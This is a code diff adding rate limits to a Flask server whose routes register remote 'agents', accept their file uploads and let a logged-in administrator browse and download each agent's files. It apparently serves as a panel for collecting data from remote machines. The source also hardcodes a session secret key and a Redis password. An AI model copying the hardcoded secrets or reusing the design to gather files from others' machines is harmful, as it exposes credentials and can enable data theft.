@@ -1,12 +1,14 @@
 from flask import (Flask, request, jsonify, Response, render_template,
                    send_file, send_from_directory, redirect, flash, url_for, session)
-import os, zipfile, string, random
+import os, zipfile, random
 from flask_sqlalchemy import SQLAlchemy
 from datetime import datetime, timedelta
 from os.path import getsize
 from flask_login import LoginManager, login_required, current_user, UserMixin, login_user, logout_user
 from werkzeug.security import generate_password_hash, check_password_hash
 from captcha.image import ImageCaptcha
+from flask_limiter import Limiter
+from flask_limiter.util import get_remote_address
 
 
 app = Flask(__name__)
@@ -17,9 +19,16 @@ login_manager.init_app(app)
 login_manager.login_view = 'login'
 app.config["SECRET_KEY"] = "fksdly48thergl9#8%3@45t%u9834tu95$hgui$rfg49$t67"
 app.config['REMEMBER_COOKIE_DURATION'] = timedelta(hours=24)
+app.config['REDIS_URL'] = 'redis://:jackass%23XX1717@localhost:6379/0'
 
+limiter = Limiter(
+    key_func=get_remote_address,
+    app=app,
+    storage_uri=app.config['REDIS_URL']
+)
 
 # ---------------------- Database tables ---------------------- #
+
 
 class Agents(db.Model):
     id = db.Column(db.Integer, primary_key=True)
@@ -70,6 +79,7 @@ def is_zip_valid(filepath):
 
 
 @app.route('/add_agent', methods=['POST'])
+@limiter.limit("3 per 1 hour")
 def add_agent():
     data = request.json
     new_agent = Agents(
@@ -91,6 +101,7 @@ def add_agent():
 
 
 @app.route('/upload', methods=['POST'])
+@limiter.limit("3 per 1 hour")
 def upload_file():
     file = request.files.get('file')
     uid = request.form.get('uid')
@@ -150,12 +161,14 @@ def upload_file():
 
 
 @app.route('/speedtest', methods=['POST'])
+@limiter.limit("3 per 1 hour")
 def speedtest():
     _ = request.data
     return "Speed test done"
 
 
 @app.route('/login', methods=['GET', 'POST'])
+@limiter.limit("10 per 1 hour")
 def login():
     if current_user.is_authenticated:
         return redirect(url_for('command'))
@@ -198,6 +211,12 @@ def login():
 @login_manager.user_loader
 def load_user(user_id):
     return Administrator.query.get(int(user_id))
+
+
+@app.errorhandler(429)
+def ratelimit_error(e):
+    return jsonify(error="ratelimit exceeded", message=str(e.description)), 429
+
 
 # ---------------------- Protected Routes ---------------------- #
 
@@ -282,7 +301,6 @@ def view_files(uid, subpath=None):
     return render_template("explorer.html", directories=directories, files=files, agent=agent, subpath=subpath,
                            breadcrumbs=breadcrumbs, total_size=total_size, num_files=num_files, total_files=total_files,
                            base_size=base_size, all_chars=all_chars, total_num_files=total_num_files)
-
 
 
 @app.route('/download_file/<uid>/<path:subpath>')
